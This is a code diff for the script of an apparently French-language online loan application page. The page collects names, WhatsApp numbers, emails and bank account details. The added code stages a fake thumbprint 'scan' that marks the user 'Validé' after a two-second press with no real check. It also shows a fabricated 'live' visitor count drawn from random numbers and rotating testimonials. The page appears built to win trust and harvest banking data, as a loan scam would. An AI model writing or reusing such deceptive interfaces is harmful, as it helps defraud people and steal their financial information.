-            document.getElementById('loader-text').innerText = t.load; document.getElementById('btn-cont-text').innerText = t.cont; document.getElementById('sim-title').innerText = t.sim; document.getElementById('lbl-amt').innerText = t.amt; document.getElementById('lbl-dur').innerText = t.dur; document.getElementById('lbl-years').innerText = t.yr; document.getElementById('res-lbl-men').innerText = t.men; document.getElementById('res-lbl-tot').innerText = t.tot; document.getElementById('btn-next').innerText = t.next; document.getElementById('form-title').innerText = t.fTitle; document.getElementById('btn-back').innerText = t.back; document.getElementById('btn-submit').innerText = t.submit; document.getElementById('btn-clear').innerText = t.clear; document.getElementById('lbl-sign').innerText = t.sign; document.getElementById('nav-testi').innerText = t.navTesti; document.getElementById('testi-title').innerText = t.testiTitle;
-            document.getElementById('i-nom').placeholder = t.pl_nom; document.getElementById('i-wa').placeholder = t.pl_wa; document.getElementById('i-email').placeholder = t.pl_email; document.getElementById('i-bank-name').placeholder = t.pl_bankName; document.getElementById('i-bank-dir').placeholder = t.pl_bankDir; document.getElementById('i-bank-acc').placeholder = t.pl_bankAcc;
-            
-            const html = t.tests.map(test => `<div class="bg-white p-3 rounded-xl shadow-sm border border-slate-100 flex items-center gap-3 mx-2"><div class="w-8 h-8 ${test.c} rounded-full flex items-center justify-center font-bold text-[10px] text-slate-700">${test.i}</div><div class="text-left"><p class="font-bold text-[10px] text-blue-900">${test.n}</p><p class="text-[9px] text-slate-500 italic">"${test.t}"</p></div></div>`).join('');
-            document.getElementById('mini-testi-scroll').innerHTML = html + html; // Double pour effet infini
-            document.getElementById('testi-list').innerHTML = t.tests.map(test => `<div class="bg-slate-50 p-4 rounded-xl flex items-center gap-4 border border-slate-100"><div class="w-12 h-12 ${test.c} rounded-full flex items-center justify-center font-bold text-slate-700">${test.i}</div><div class="text-left"><p class="font-bold text-sm text-blue-900">${test.n}</p><p class="text-xs text-slate-500 italic">"${test.t}"</p></div></div>`).join('');
+        
+        function upUI(l) {
+            const t = tr[l]; document.getElementById('loader-text').innerText = t.load; document.getElementById('btn-cont-text').innerText = t.cont; document.getElementById('sim-title').innerText = t.sim; document.getElementById('lbl-amt').innerText = t.amt; document.getElementById('lbl-dur').innerText = t.dur; document.getElementById('lbl-years').innerText = t.yr; document.getElementById('res-lbl-men').innerText = t.men; document.getElementById('res-lbl-tot').innerText = t.tot; document.getElementById('btn-next').innerText = t.next; document.getElementById('form-title').innerText = t.fTitle; document.getElementById('btn-back').innerText = t.back; document.getElementById('btn-submit').innerText = t.submit; document.getElementById('nav-testi').innerText = t.navTesti; document.getElementById('testi-title').innerText = t.testiTitle; document.getElementById('lbl-scan').innerText = t.scan; document.getElementById('scan-instruction').innerText = t.scanInst;
+            document.getElementById('i-nom').placeholder = t.pl_nom; document.getElementById('i-wa').placeholder = t.pl_wa; document.getElementById('i-email').placeholder = t.pl_email; document.getElementById('i-bank-name').placeholder = t.pl_bankName; document.getElementById('i-bank-acc').placeholder = t.pl_bankAcc;
+            const h = t.tests.map(x => `<div class="bg-white p-3 rounded-2xl shadow-sm border border-slate-100 flex items-center gap-3 mx-2 min-w-[180px]"><div class="w-8 h-8 ${x.c} rounded-full flex items-center justify-center font-bold text-[10px]">${x.i}</div><div class="text-left text-[9px]"><p class="font-bold">${x.n}</p><p class="text-slate-400 italic">"${x.t}"</p></div></div>`).join('');
+            document.getElementById('mini-testi-scroll').innerHTML = h + h;
+            document.getElementById('testi-list').innerHTML = t.tests.map(x => `<div class="bg-slate-50 p-5 rounded-3xl flex items-center gap-4 border border-slate-100"><div class="w-14 h-14 ${x.c} rounded-full flex items-center justify-center font-bold text-xl">${x.i}</div><div class="text-left"><p class="font-black text-blue-900">${x.n}</p><p class="text-sm text-slate-500 italic">"${x.t}"</p></div></div>`).join('');
             upCD();
         }
-        function upCD() { const o = document.getElementById('country-select').options[document.getElementById('country-select').selectedIndex]; document.getElementById('phone-prefix').innerText = o.getAttribute('data-code'); cC = o.getAttribute('data-curr'); calc(); }
-        function updateLiveCount() { const n = Math.floor(Math.random() * 20 + 35); document.getElementById('live-count').innerText = `${n} ${tr[cL].live}`; }
-        setInterval(updateLiveCount, 4000); window.onload = () => { selectLang('fr', '€'); calc(); };
+
+        // SCAN LOGIC
+        let st; const lsr = document.getElementById('laser-line'), fgr = document.getElementById('finger-icon'), inst = document.getElementById('scan-instruction'), stat = document.getElementById('status-text');
+        function startScan() { if(document.getElementById('h-auth').value === "Validé") return; lsr.classList.remove('hidden'); fgr.classList.add('text-blue-600', 'animate-pulse'); stat.classList.remove('hidden'); stat.innerText = tr[cL].scanActive; inst.classList.add('hidden'); st = setTimeout(done, 2000); }
+        function done() { lsr.classList.add('hidden'); fgr.classList.replace('text-blue-600', 'text-green-500'); fgr.innerHTML = '<i class="fas fa-check-circle"></i>'; fgr.classList.remove('animate-pulse'); stat.innerText = tr[cL].scanDone; stat.classList.replace('text-blue-700', 'text-green-600'); document.getElementById('h-auth').value = "Validé"; if (navigator.vibrate) navigator.vibrate(100); }
+        window.onmouseup = window.ontouchend = () => { if(document.getElementById('h-auth').value !== "Validé") { clearTimeout(st); lsr.classList.add('hidden'); fgr.classList.remove('text-blue-600', 'animate-pulse'); stat.classList.add('hidden'); inst.classList.remove('hidden'); } };
+
+        function handleFormSubmit(e) { e.preventDefault(); if(document.getElementById('h-auth').value !== "Validé") { alert("Scanner votre pouce"); return; } document.getElementById('global-loader').classList.remove('hidden'); setTimeout(() => { document.getElementById('loanForm').submit(); }, 4000); }
+        function upCD() { const o = document.getElementById('country-select').options[document.getElementById('country-select').selectedIndex]; cC = o.getAttribute('data-curr'); calc(); }
+        function toggleTestimonials() { document.getElementById('page-testi').classList.toggle('hidden'); }
+        setInterval(() => { const n = Math.floor(Math.random() * 20 + 40); document.getElementById('live-count').innerText = `${n} ${tr[cL].live}`; }, 5000);
+        window.onload = () => { selectLang('fr', '€'); calc(); };
     </script>
 </body>
-    </html>
-    
+                            </html>
+                        
